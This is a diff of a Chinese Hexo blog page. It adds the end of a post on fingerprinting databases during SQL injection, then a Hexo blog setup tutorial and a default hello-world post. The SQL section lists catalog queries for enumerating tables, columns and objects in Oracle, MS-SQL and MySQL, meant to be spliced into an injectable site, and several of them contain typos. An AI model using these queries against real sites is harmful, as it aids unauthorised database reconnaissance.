+<p>d)  显示用户表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select object_name,object_type,from user_objectsWHEREobject_type=’TABLE’或者显示用户访问的所有表，从其中获取信息</div><div class="line">Select table_name form all_tables</div><div class="line">2.  MS-SQL</div><div class="line">Select name from sysobjectsWHERExtype=’U’</div><div class="line">3.  MYSQL</div><div class="line">Select table_name from information_schema.tables <span class="built_in">where</span> table_type=’BASE TABLE’ and table_schema!=’mysql’</div></pre></td></tr></table></figure></p>
+<p>e)  显示表foo的列名称<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select column_name,Name form uer_tab_columns <span class="built_in">where</span> table_name = ‘FOO’,如果目标数据部位当前应用程序用户所有，使用ALL_table_columns表</div><div class="line">2.  MS-SQL</div><div class="line">Select column_name,FORM information_schema.columns <span class="built_in">where</span> table_name=’foo’</div><div class="line">3.  MYSQL</div><div class="line">Select column_name from information_schema.columns <span class="built_in">where</span> table_name=’foo’</div></pre></td></tr></table></figure></p>
+<p>f)  显示用户对象<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select object_name,object_type from user_objects</div><div class="line">2.  MS-SQL</div><div class="line">Select name form sysobjects</div><div class="line">3.  MYSQL</div><div class="line">Select table_name from information_schema.tables或者select trigger_name from information_schema.triggers</div></pre></td></tr></table></figure></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>如果对于一个存在sql注入的站点来说，前两点可以轻松判断数据库的类型，最后的一点，可以根据实际情况进行sql拼接构造，对一个数据库进行探测</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cjca1zrwr000q881byhrnp3qn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Hexo-搭建Blog教程" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/06/18/Hexo-搭建Blog教程/" class="article-date">
+  <time datetime="2016-06-18T11:48:25.000Z" itemprop="datePublished">2016-06-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/18/Hexo-搭建Blog教程/">Hexo 搭建Blog教程</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>平时在浏览博客的时候发现好多人喜欢利用Hexo + Github搭建个人博客，正好一直也想搭建一个博客去记录和分享。在此过程中，折腾各种配置花了一些时间，所以详细记录一下遇到的相关问题。</p>
+<h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><p>下载<a href="https://git-scm.com/download/win" target="_blank" rel="external">git</a>,安装很简单，一路next下去</p>
+<h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p>下载<a href="https://nodejs.org/en/" target="_blank" rel="external">node.js</a>，安装也是一路next</p>
+<h3 id="3-本地搭建hexo博客"><a href="#3-本地搭建hexo博客" class="headerlink" title="3.本地搭建hexo博客"></a>3.本地搭建hexo博客</h3><p>安装hexo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure></p>
+<p>测试hexo是否安装成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo version</div></pre></td></tr></table></figure></p>
+<p>新建一个文件夹，如MyBlog<br>进入该文件夹内，右击运行git，依次输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ hexo init</div><div class="line">$ npm install</div><div class="line">$ hexo g</div><div class="line">$ hexo s</div></pre></td></tr></table></figure></p>
+<p>这时候在浏览器输入<a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a> 就可以看到hexo已经成功生成了博客，当然这只是我们本地可以看到的</p>
+<h3 id="3-Github配置"><a href="#3-Github配置" class="headerlink" title="3.Github配置"></a>3.Github配置</h3><p>登陆github后点击new repository，Repository name填写自己的名称 + .github.io，<br><img src="/upload_image/1.jpg" alt=""><br>直接点Create repository就可以了。</p>
+<h3 id="4-配置Github-SSH密钥"><a href="#4-配置Github-SSH密钥" class="headerlink" title="4.配置Github SSH密钥"></a>4.配置Github SSH密钥</h3><p>在桌面空白处鼠标右键选择Git Bash Here<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C <span class="string">"your's emaill address"</span></div></pre></td></tr></table></figure></p>
+<p>引号里面的内容输入你的邮箱地址，然后回车，会提示你文件保存的路径，按回车键确认<br>然后会提示你输入密码，然后会确认输入一次，就可以在刚刚的路径看到生成了两个文件，一个是id_rsa，另一个是id_rsa.pub，用notepadd++打开id_rsa.pub然后选中里面的全部内容，复制下来。<br>登陆github，点击头像进入setting选项<br><img src="/upload_image/2.jpg" alt=""></p>
+<h3 id="5-将hexo博客与Github关联"><a href="#5-将hexo博客与Github关联" class="headerlink" title="5.将hexo博客与Github关联"></a>5.将hexo博客与Github关联</h3><p>修改_config.yml<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">deploy:</div><div class="line">  <span class="built_in">type</span>: git</div><div class="line">  repository: http://github.com/yourname/yourname.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure></p>
+<p>打开Git bash here<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ hexo g</div><div class="line">$ hexo d</div></pre></td></tr></table></figure></p>
+<p>如果出现如下异常<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR Deployer not found: git</div></pre></td></tr></table></figure></p>
+<p>输入以下命令，然后重新执行上面两条命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure></p>
+<p>这时候如果弹出一个对话框，输入在guthub上面的用户名和密码即可<br>这时候我们就可以在浏览器输入<a href="http://yourname.github.io（yourname替换成github上的名称）就可以看到博客已经搭建成功了。" target="_blank" rel="external">http://yourname.github.io（yourname替换成github上的名称）就可以看到博客已经搭建成功了。</a></p>
+<h3 id="更新博客内容"><a href="#更新博客内容" class="headerlink" title="更新博客内容"></a>更新博客内容</h3><p>在MyBlog目录下执行：hexo new “我的第一篇文章”，会在source-&gt;_posts文件夹内生成一个.md文件。<br>编辑该文件（遵循Markdown规则）<br>修改起始字段<br>title 文章的标题<br>date 创建日期 （文件的创建日期 ）<br>updated 修改日期 （ 文件的修改日期）<br>comments 是否开启评论 true<br>tags 标签<br>categories 分类<br>permalink url中的名字（文件名）<br>编写正文内容（MakeDown）<br>hexo clean 删除本地静态文件（Public目录），可不执行。<br>hexo g 生成本地静态文件（Public目录）<br>hexo deploy 将本地静态文件推送至github（hexo d）</p>
+<h4 id="MarkDown语法"><a href="#MarkDown语法" class="headerlink" title="MarkDown语法"></a>MarkDown语法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[hexo](http://www.baidu.com)  表示超链接</div><div class="line"><span class="comment">##大标题</span></div><div class="line"><span class="comment">###小标题</span></div><div class="line">&lt;!-- more --&gt;</div><div class="line">&lt;!-- 标签别名 --&gt;</div><div class="line">&#123;% cq %&#125;blah blah blah&#123;% endcq %&#125;</div><div class="line">空格  中文全角空格表示</div><div class="line">---</div><div class="line">文章标题</div><div class="line">---</div><div class="line">&gt;内容     区块引用</div><div class="line">*1</div><div class="line">*2</div><div class="line">*3</div><div class="line">列表</div><div class="line">*内容*     表示强调内容</div><div class="line">![Alt text](/path/to/img.jpg)  图片</div><div class="line">![](/upload_image/20161012/1.png)</div></pre></td></tr></table></figure>
+<blockquote class="blockquote-center"></blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/06/18/Hexo-搭建Blog教程/" data-id="cjca1zrwh000e881b3cn5hy3c" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/06/08/hello-world/" class="article-date">
+  <time datetime="2016-06-08T01:46:54.000Z" itemprop="datePublished">2016-06-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/08/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/06/08/hello-world/" data-id="cjca1zrwd000b881bsy5pm9ab" class="article-share-link">Share</a>
       
       
     </footer>
@@ -639,7 +478,7 @@
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">__('next') &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
   </nav>
 </section>
         
@@ -657,7 +496,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -665,28 +504,28 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Articles récents</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2018/01/05/浏览器工作原理/">浏览器工作原理</a>
+            <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/">利用java反序列化漏洞植入门罗币挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/">powershell植入mule挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/">利用s2-045植入门罗币挖矿程序事件分析</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/09/s2-045入侵事件分析/">s2-045入侵事件分析</a>
           </li>
         
           <li>
             <a href="/2018/01/05/几种常见检测思路的特点/">几种常见检测思路的特点</a>
-          </li>
-        
-          <li>
-            <a href="/2018/01/02/机器学习之安全数据集/">机器学习之安全数据集</a>
-          </li>
-        
-          <li>
-            <a href="/2017/12/27/大型互联网企业入侵检测实战总结/">大型互联网企业入侵检测实战总结</a>
-          </li>
-        
-          <li>
-            <a href="/2017/11/27/Shodan-快速入门/">Shodan 快速入门</a>
           </li>
         
       </ul>
@@ -703,7 +542,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 SY0U<br>
-      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
